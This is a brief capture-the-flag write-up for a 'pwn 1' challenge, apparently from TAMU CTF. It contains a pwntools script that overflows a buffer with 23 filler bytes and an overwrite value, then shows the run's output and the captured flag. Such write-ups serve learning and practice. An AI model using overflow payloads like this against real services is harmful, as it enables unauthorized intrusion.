# **pwn 1**

#### tag : pwnable

-----------------------------------------------

#### Description

>nc pwn.ctf.tamu.edu 4321

-----------------------------------------------

#### Solution

~~~

from pwn import *

#context.log_level = 'debug'
r = remote('pwn.ctf.tamu.edu',4321)

payload = ''
payload += 'a' * 23
payload += '\x11\xba\x07\xf0'

r.sendline(payload)
print r.recvuntil('}')

~~~

~~~

$ python pwn1.py

[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/epist/.pwntools-cache/update to 'never'.
[*] A newer version of pwntools is available on pypi (3.11.0 --> 3.12.0).
    Update with: $ pip install -U pwntools
[+] Opening connection to pwn.ctf.tamu.edu on port 4321: Done
This is a super secret program
Noone is allowed through except for those who know the secret!
What is my secret?
How did you figure out my secret?!
gigem{H0W_H4RD_1S_TH4T?}
[*] Closed connection to pwn.ctf.tamu.edu port 4321

~~~


**gigem{H0W_H4RD_1S_TH4T?}**
